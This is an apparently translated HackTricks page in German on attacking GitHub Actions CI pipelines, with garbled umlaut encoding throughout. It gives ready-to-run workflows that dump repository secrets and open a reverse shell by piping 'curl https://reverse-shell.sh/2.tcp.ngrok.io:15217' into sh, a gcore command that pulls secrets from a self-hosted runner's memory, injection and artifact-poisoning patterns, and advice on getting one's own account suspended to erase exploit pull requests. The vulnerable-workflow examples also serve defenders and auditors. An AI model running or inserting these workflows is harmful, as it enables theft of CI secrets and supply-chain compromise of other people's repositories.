# Missbrauch von Github Actions

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repos einreichst.

</details>
{% endhint %}

## Grundinformationen

Auf dieser Seite findest du:

* Eine **Zusammenfassung aller Auswirkungen**, wenn es einem Angreifer gelingt, auf eine Github Action zuzugreifen
* Verschiedene M√∂glichkeiten, um **Zugriff auf eine Action zu erhalten**:
* Berechtigungen, um die Action zu erstellen
* Missbrauch von **Pull-Request**-bezogenen Triggern
* Missbrauch von **anderen externen Zugriffstechniken**
* **Pivoting** von einem bereits kompromittierten Repo
* Schlie√ülich ein Abschnitt √ºber **Post-Exploitation-Techniken, um eine Action von innen zu missbrauchen** (um die genannten Auswirkungen zu verursachen)

## Zusammenfassung der Auswirkungen

F√ºr eine Einf√ºhrung √ºber [**Github Actions, siehe die grundlegenden Informationen**](../basic-github-information.md#github-actions).

Falls du **beliebige Github Actions ausf√ºhren/in einem** **Repository** **Code injizieren** kannst, k√∂nntest du in der Lage sein:

* **Geheime** **Daten** aus diesem Repo/Organisation zu **stehlen**.
* Wenn du nur injizieren kannst, kannst du stehlen, was bereits im Workflow vorhanden ist.
* **Repo-Berechtigungen** missbrauchen, um auf andere Plattformen wie AWS und GCP zuzugreifen.
* **Code in benutzerdefinierten Workern ausf√ºhren** (wenn benutzerdefinierte Worker verwendet werden) und versuchen, von dort aus zu pivotieren.
* **Code** im Repository **√ºberschreiben**.
* Dies h√§ngt von den Berechtigungen des `GITHUB_TOKEN` ab (falls vorhanden).
* **Kompromittierte** **Deployments** und andere **Artefakte**.
* Wenn der Code etwas bereitstellt oder speichert, k√∂nntest du das √§ndern und weiteren Zugriff erhalten.

## GITHUB\_TOKEN

Dieses "**Geheimnis**" (stammend von `${{ secrets.GITHUB_TOKEN }}` und `${{ github.token }}`) wird gegeben, wenn der Administrator diese Option aktiviert:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Dieses Token ist dasselbe, das eine **Github-Anwendung verwenden wird**, sodass es auf dieselben Endpunkte zugreifen kann: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github sollte einen [**Flow**](https://github.com/github/roadmap/issues/74) ver√∂ffentlichen, der **cross-repository** Zugriff innerhalb von GitHub **erm√∂glicht**, sodass ein Repo auf andere interne Repos mit dem `GITHUB_TOKEN` zugreifen kann.
{% endhint %}

Du kannst die m√∂glichen **Berechtigungen** dieses Tokens hier einsehen: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Beachte, dass das Token **nach Abschluss des Jobs abl√§uft**.\
Diese Tokens sehen so aus: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Einige interessante Dinge, die du mit diesem Token tun kannst:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="PR genehmigen" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PR erstellen" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Beachten Sie, dass Sie in mehreren F√§llen **Github-Benutzertoken in den Umgebungsvariablen von Github Actions oder in den Geheimnissen** finden k√∂nnen. Diese Token k√∂nnen Ihnen mehr Berechtigungen √ºber das Repository und die Organisation geben.
{% endhint %}

<details>

<summary>Geheimnisse im Github Action-Ausgang auflisten</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Erhalte eine Reverse-Shell mit Geheimnissen</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Es ist m√∂glich, die Berechtigungen eines Github Tokens in den Repositories anderer Benutzer **durch √úberpr√ºfung der Protokolle** der Aktionen zu √ºberpr√ºfen:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Erlaubte Ausf√ºhrung

{% hint style="info" %}
Dies w√§re der einfachste Weg, Github-Aktionen zu kompromittieren, da dieser Fall voraussetzt, dass Sie **ein neues Repo in der Organisation erstellen** k√∂nnen oder **Schreibrechte √ºber ein Repository** haben.

Wenn Sie sich in diesem Szenario befinden, k√∂nnen Sie einfach die [Post Exploitation-Techniken](./#post-exploitation-techniques-from-inside-an-action) √ºberpr√ºfen.
{% endhint %}

### Ausf√ºhrung aus der Repo-Erstellung

Falls Mitglieder einer Organisation **neue Repos erstellen** k√∂nnen und Sie Github-Aktionen ausf√ºhren k√∂nnen, k√∂nnen Sie **ein neues Repo erstellen und die auf Organisationsebene festgelegten Geheimnisse stehlen**.

### Ausf√ºhrung aus einem neuen Branch

Wenn Sie **einen neuen Branch in einem Repository erstellen k√∂nnen, das bereits eine konfigurierte Github Action enth√§lt**, k√∂nnen Sie diese **modifizieren**, den Inhalt **hochladen** und dann **diese Aktion aus dem neuen Branch ausf√ºhren**. Auf diese Weise k√∂nnen Sie **Geheimnisse auf Repository- und Organisationsebene exfiltrieren** (aber Sie m√ºssen wissen, wie sie genannt werden).

Sie k√∂nnen die modifizierte Aktion **manuell** ausf√ºhrbar machen, wenn ein **PR erstellt wird** oder wenn **einige Codes gepusht werden** (je nachdem, wie auff√§llig Sie sein m√∂chten):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
Es gibt verschiedene Trigger, die es einem Angreifer erm√∂glichen k√∂nnten, eine **Github Action eines anderen Repositories** **auszuf√ºhren**. Wenn diese ausl√∂sbaren Aktionen schlecht konfiguriert sind, k√∂nnte ein Angreifer in der Lage sein, sie zu kompromittieren.
{% endhint %}

### `pull_request`

Der Workflow-Trigger **`pull_request`** wird den Workflow jedes Mal ausf√ºhren, wenn ein Pull-Request empfangen wird, mit einigen Ausnahmen: standardm√§√üig, wenn es das **erste Mal** ist, dass Sie **mitarbeiten**, muss ein **Maintainer** den **Ausf√ºhrungs** des Workflows **genehmigen**:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Da die **Standardbeschr√§nkung** f√ºr **Erstbeitragsleistende** gilt, k√∂nnten Sie **einen g√ºltigen Bug/Tippfehler beheben** und dann **andere PRs senden, um Ihre neuen `pull_request`-Befugnisse auszunutzen**.

**Ich habe das getestet und es funktioniert nicht**: ~~Eine andere M√∂glichkeit w√§re, ein Konto mit dem Namen von jemandem zu erstellen, der zum Projekt beigetragen hat und dessen Konto gel√∂scht wurde.~~
{% endhint %}

Dar√ºber hinaus **verhindert standardm√§√üig Schreibberechtigungen** und **Zugriff auf Geheimnisse** f√ºr das Ziel-Repository, wie in den [**Docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) erw√§hnt:

> Mit Ausnahme von `GITHUB_TOKEN` werden **Geheimnisse nicht an den Runner √ºbergeben**, wenn ein Workflow aus einem **geforderten** Repository ausgel√∂st wird. Das **`GITHUB_TOKEN` hat nur Lesezugriff** in Pull-Requests **von geforkten Repositories**.

Ein Angreifer k√∂nnte die Definition der Github Action √§ndern, um beliebige Dinge auszuf√ºhren und beliebige Aktionen anzuh√§ngen. Er wird jedoch aufgrund der genannten Einschr√§nkungen nicht in der Lage sein, Geheimnisse zu stehlen oder das Repo zu √ºberschreiben.

{% hint style="danger" %}
**Ja, wenn der Angreifer im PR die Github Action √§ndert, die ausgel√∂st wird, wird seine Github Action verwendet und nicht die aus dem Ursprungsrepo!**
{% endhint %}

Da der Angreifer auch den ausgef√ºhrten Code kontrolliert, k√∂nnte er beispielsweise **b√∂sartige Artefakte hochladen**, selbst wenn es keine Geheimnisse oder Schreibberechtigungen f√ºr das `GITHUB_TOKEN` gibt.

### **`pull_request_target`**

Der Workflow-Trigger **`pull_request_target`** hat **Schreibberechtigungen** f√ºr das Ziel-Repository und **Zugriff auf Geheimnisse** (und fragt nicht nach Erlaubnis).

Beachten Sie, dass der Workflow-Trigger **`pull_request_target`** **im Basis-Kontext** und nicht im durch den PR gegebenen Kontext ausgef√ºhrt wird (um **nicht vertrauensw√ºrdigen Code nicht auszuf√ºhren**). F√ºr weitere Informationen zu `pull_request_target` [**√ºberpr√ºfen Sie die Docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Dar√ºber hinaus finden Sie weitere Informationen zu dieser spezifischen gef√§hrlichen Verwendung in diesem [**Github-Blogbeitrag**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Es k√∂nnte so aussehen, als w√§re der **ausgef√ºhrte Workflow** der, der in der **Basis** definiert ist und **nicht im PR**, was es **sicher** macht, **`pull_request_target`** zu verwenden, aber es gibt **einige F√§lle, in denen dies nicht der Fall ist**.

Und dieser hat **Zugriff auf Geheimnisse**.

### `workflow_run`

Der [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) Trigger erm√∂glicht es, einen Workflow von einem anderen auszuf√ºhren, wenn er `abgeschlossen`, `angefordert` oder `in Bearbeitung` ist.

In diesem Beispiel ist ein Workflow so konfiguriert, dass er nach dem Abschluss des separaten "Tests ausf√ºhren"-Workflows ausgef√ºhrt wird:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: Der durch das `workflow_run`-Ereignis gestartete Workflow kann **Geheimnisse abrufen und Token schreiben, auch wenn der vorherige Workflow nicht**.

Diese Art von Workflow k√∂nnte angegriffen werden, wenn sie **von** einem **Workflow** abh√§ngt, der von einem externen Benutzer √ºber **`pull_request`** oder **`pull_request_target`** **ausgel√∂st** werden kann. Einige anf√§llige Beispiele k√∂nnen [**in diesem Blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)** gefunden werden.** Der erste besteht darin, dass der durch **`workflow_run`** ausgel√∂ste Workflow den Code des Angreifers herunterl√§dt: `${{ github.event.pull_request.head.sha }}`\
Der zweite besteht darin, ein **Artifact** vom **nicht vertrauensw√ºrdigen** Code an den **`workflow_run`**-Workflow zu **√ºbergeben** und den Inhalt dieses Artifacts auf eine Weise zu verwenden, die es **anf√§llig f√ºr RCE** macht.

### `workflow_call`

TODO

TODO: √úberpr√ºfen, ob der verwendete/heruntergeladene Code bei der Ausf√ºhrung von einem pull_request der aus dem Ursprung oder vom geforkten PR stammt

## Missbrauch von geforkter Ausf√ºhrung

Wir haben alle M√∂glichkeiten erw√§hnt, wie ein externer Angreifer einen GitHub-Workflow ausf√ºhren k√∂nnte. Schauen wir uns nun an, wie diese Ausf√ºhrungen, wenn sie schlecht konfiguriert sind, missbraucht werden k√∂nnten:

### Nicht vertrauensw√ºrdige Checkout-Ausf√ºhrung

Im Fall von **`pull_request`** wird der Workflow im **Kontext des PR** ausgef√ºhrt (er wird also den **b√∂sartigen PR-Code** ausf√ºhren), aber jemand muss ihn **zuerst autorisieren**, und er wird mit einigen [Einschr√§nkungen](./#pull_request) ausgef√ºhrt.

Im Fall eines Workflows, der **`pull_request_target` oder `workflow_run`** verwendet und von einem Workflow abh√§ngt, der von **`pull_request_target` oder `pull_request`** ausgel√∂st werden kann, wird der Code aus dem urspr√ºnglichen Repo ausgef√ºhrt, sodass der **Angreifer den ausgef√ºhrten Code nicht kontrollieren kann**.

{% hint style="danger" %}
Wenn jedoch die **Aktion** einen **expliziten PR-Checkout** hat, der **den Code vom PR** (und nicht von der Basis) **holt**, wird der vom Angreifer kontrollierte Code verwendet. Zum Beispiel (siehe Zeile 12, wo der PR-Code heruntergeladen wird):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># UNSICHER. Nur als Beispiel bereitgestellt.
on:
pull_request_target

jobs:
build:
name: Build und Test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Danke!
</code></pre>

Der potenziell **nicht vertrauensw√ºrdige Code wird w√§hrend `npm install` oder `npm build`** ausgef√ºhrt, da die Build-Skripte und die referenzierten **Pakete vom Autor des PR** kontrolliert werden.

{% hint style="warning" %}
Ein GitHub-Dork, um nach anf√§lligen Aktionen zu suchen, ist: `event.pull_request pull_request_target extension:yml`, jedoch gibt es verschiedene M√∂glichkeiten, die Jobs sicher auszuf√ºhren, selbst wenn die Aktion unsicher konfiguriert ist (wie die Verwendung von Bedingungen dar√ºber, wer der Akteur ist, der den PR generiert).
{% endhint %}

### Kontext-Skript-Injektionen <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Beachten Sie, dass es bestimmte [**GitHub-Kontexte**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) gibt, deren Werte vom **Benutzer** erstellt werden, der den PR erstellt. Wenn die GitHub-Aktion diese **Daten verwendet, um irgendetwas auszuf√ºhren**, k√∂nnte dies zu **willk√ºrlicher Codeausf√ºhrung** f√ºhren:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Skript-Injektion** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Aus den Dokumenten: Sie k√∂nnen eine **Umgebungsvariable f√ºr alle nachfolgenden Schritte** in einem Workflow-Job verf√ºgbar machen, indem Sie die Umgebungsvariable definieren oder aktualisieren und dies in die **`GITHUB_ENV`**-Umgebungsdatei schreiben.

Wenn ein Angreifer **irgendeinen Wert** in diese **env**-Variable **einschleusen** k√∂nnte, k√∂nnte er Umgebungsvariablen injizieren, die in nachfolgenden Schritten Code ausf√ºhren k√∂nnten, wie **LD\_PRELOAD** oder **NODE\_OPTIONS**.

Zum Beispiel ([**dies**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) und [**dies**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), stellen Sie sich einen Workflow vor, der einem hochgeladenen Artifact vertraut, um seinen Inhalt in der **`GITHUB_ENV`**-Umgebungsvariable zu speichern. Ein Angreifer k√∂nnte etwas wie dies hochladen, um es zu kompromittieren:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Anf√§llige Drittanbieter-GitHub-Aktionen

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Wie in [**diesem Blogbeitrag**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) erw√§hnt, erm√∂glicht diese GitHub-Aktion den Zugriff auf Artefakte aus verschiedenen Workflows und sogar Repositories.

Das Problem ist, dass, wenn der **`path`**-Parameter nicht gesetzt ist, das Artifact im aktuellen Verzeichnis extrahiert wird und Dateien √ºberschreiben kann, die sp√§ter im Workflow verwendet oder sogar ausgef√ºhrt werden k√∂nnten. Daher k√∂nnte ein Angreifer dies ausnutzen, um andere Workflows zu kompromittieren, die dem Artifact vertrauen.

Beispiel eines anf√§lligen Workflows:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Dies k√∂nnte mit diesem Workflow angegriffen werden:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Anderer externer Zugriff

### Gel√∂schte Namespace-Repo-Hijacking

Wenn ein Konto seinen Namen √§ndert, k√∂nnte ein anderer Benutzer nach einiger Zeit ein Konto mit diesem Namen registrieren. Wenn ein Repository **weniger als 100 Sterne vor der Namens√§nderung hatte**, erlaubt Github dem neu registrierten Benutzer mit demselben Namen, ein **Repository mit demselben Namen** wie das gel√∂schte zu erstellen.

{% hint style="danger" %}
Wenn eine Aktion ein Repo von einem nicht existierenden Konto verwendet, ist es immer noch m√∂glich, dass ein Angreifer dieses Konto erstellen und die Aktion kompromittieren k√∂nnte.
{% endhint %}

Wenn andere Repositories **Abh√§ngigkeiten von diesen Benutzer-Repos** verwendeten, wird ein Angreifer in der Lage sein, sie zu hijacken. Hier haben Sie eine umfassendere Erkl√§rung: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo-Pivoting

{% hint style="info" %}
In diesem Abschnitt werden wir √ºber Techniken sprechen, die es erm√∂glichen, **von einem Repo zu einem anderen zu pivotieren**, vorausgesetzt, wir haben eine Art von Zugriff auf das erste (siehe den vorherigen Abschnitt).
{% endhint %}

### Cache-Poisoning

Ein Cache wird zwischen **Workflow-Ausf√ºhrungen im selben Branch** aufrechterhalten. Das bedeutet, dass, wenn ein Angreifer ein **Paket kompromittiert**, das dann im Cache gespeichert und von einem **privilegierteren** Workflow **heruntergeladen** und ausgef√ºhrt wird, er auch diesen Workflow **kompromittieren** kann.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Artifact-Poisoning

Workflows k√∂nnten **Artefakte von anderen Workflows und sogar Repos** verwenden. Wenn es einem Angreifer gelingt, die Github Action zu **kompromittieren**, die ein **Artefakt hochl√§dt**, das sp√§ter von einem anderen Workflow verwendet wird, k√∂nnte er **die anderen Workflows kompromittieren**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post-Exploitation von einer Aktion

### Zugriff auf AWS und GCP √ºber OIDC

√úberpr√ºfen Sie die folgenden Seiten:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Zugriff auf Geheimnisse <a href="#accessing-secrets" id="accessing-secrets"></a>

Wenn Sie Inhalte in ein Skript injizieren, ist es interessant zu wissen, wie Sie auf Geheimnisse zugreifen k√∂nnen:

* Wenn das Geheimnis oder Token auf eine **Umgebungsvariable** gesetzt ist, kann es direkt √ºber die Umgebung mit **`printenv`** zugegriffen werden.

<details>

<summary>Geheimnisse in der Github Action-Ausgabe auflisten</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Erhalte eine Reverse-Shell mit Geheimnissen</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Wenn das Geheimnis **direkt in einem Ausdruck** verwendet wird, wird das generierte Shell-Skript **auf der Festplatte** gespeichert und ist zug√§nglich.
* ```bash
cat /home/runner/work/_temp/*
```
* Bei JavaScript-Aktionen werden die Geheimnisse √ºber Umgebungsvariablen gesendet.
* ```bash
ps axe | grep node
```
*   Bei einer **benutzerdefinierten Aktion** kann das Risiko variieren, je nachdem, wie ein Programm das Geheimnis verwendet, das es aus dem **Argument** erhalten hat:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Missbrauch von selbst gehosteten Runnern

Der Weg, um herauszufinden, welche **Github Actions in nicht-Github-Infrastrukturen ausgef√ºhrt werden**, besteht darin, nach **`runs-on: self-hosted`** in der Github Action-Konfigurations-YAML zu suchen.

**Selbst gehostete** Runner k√∂nnten Zugang zu **extra sensiblen Informationen**, zu anderen **Netzwerksystemen** (anf√§llige Endpunkte im Netzwerk? Metadatenservice?) haben oder, selbst wenn sie isoliert und zerst√∂rt sind, **k√∂nnten mehr als eine Aktion gleichzeitig ausgef√ºhrt werden** und die b√∂sartige k√∂nnte die **Geheimnisse** der anderen stehlen.

Bei selbst gehosteten Runnern ist es auch m√∂glich, die **Geheimnisse aus dem \_Runner.Listener**\_\*\* Prozess\*\* zu erhalten, der alle Geheimnisse der Workflows zu jedem Zeitpunkt enth√§lt, indem man seinen Speicher dumpet:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

√úberpr√ºfen Sie [**diesen Beitrag f√ºr weitere Informationen**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Es ist m√∂glich, Github-Aktionen zu erstellen, die **ein Docker-Image innerhalb von Github erstellen und speichern**.\
Ein Beispiel finden Sie im folgenden ausklappbaren Bereich:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Wie Sie im vorherigen Code sehen konnten, wird das Github-Registry in **`ghcr.io`** gehostet.

Ein Benutzer mit Lesezugriff auf das Repository kann dann das Docker-Image mit einem pers√∂nlichen Zugriffstoken herunterladen:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Dann k√∂nnte der Benutzer nach **leaked secrets in den Docker-Image-Schichten suchen:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Sensible Informationen in Github Actions-Protokollen

Selbst wenn **Github** versucht, **geheime Werte** in den Aktionsprotokollen zu **erkennen** und **zu vermeiden**, dass sie angezeigt werden, werden **andere sensible Daten**, die w√§hrend der Ausf√ºhrung der Aktion generiert wurden, nicht verborgen. Zum Beispiel wird ein mit einem geheimen Wert signiertes JWT nicht verborgen, es sei denn, es ist [speziell konfiguriert](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Spuren verwischen

(Technik von [**hier**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Zun√§chst einmal ist jeder PR, der erstellt wird, f√ºr die √ñffentlichkeit in Github und f√ºr das Ziel-GitHub-Konto deutlich sichtbar. In GitHub k√∂nnen wir standardm√§√üig **einen PR aus dem Internet nicht l√∂schen**, aber es gibt einen Haken. F√ºr GitHub-Konten, die von Github **suspendiert** wurden, werden alle ihre **PRs automatisch gel√∂scht** und aus dem Internet entfernt. Um also Ihre Aktivit√§ten zu verbergen, m√ºssen Sie entweder Ihr **GitHub-Konto suspendiert bekommen oder Ihr Konto kennzeichnen lassen**. Dies w√ºrde **alle Ihre Aktivit√§ten** auf GitHub aus dem Internet verbergen (im Grunde alle Ihre Exploit-PRs entfernen).

Eine Organisation in GitHub ist sehr proaktiv darin, Konten an GitHub zu melden. Alles, was Sie tun m√ºssen, ist, ‚Äûeinige Dinge‚Äú in einem Issue zu teilen, und sie werden sicherstellen, dass Ihr Konto in 12 Stunden suspendiert wird :p und da haben Sie es, Ihr Exploit ist auf GitHub unsichtbar gemacht.

{% hint style="warning" %}
Der einzige Weg f√ºr eine Organisation herauszufinden, dass sie ins Visier genommen wurde, besteht darin, die GitHub-Protokolle von SIEM zu √ºberpr√ºfen, da der PR aus der GitHub-Benutzeroberfl√§che entfernt w√ºrde.
{% endhint %}

## Werkzeuge

Die folgenden Werkzeuge sind n√ºtzlich, um Github Action-Workflows zu finden und sogar verwundbare zu finden:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks unterst√ºtzen</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
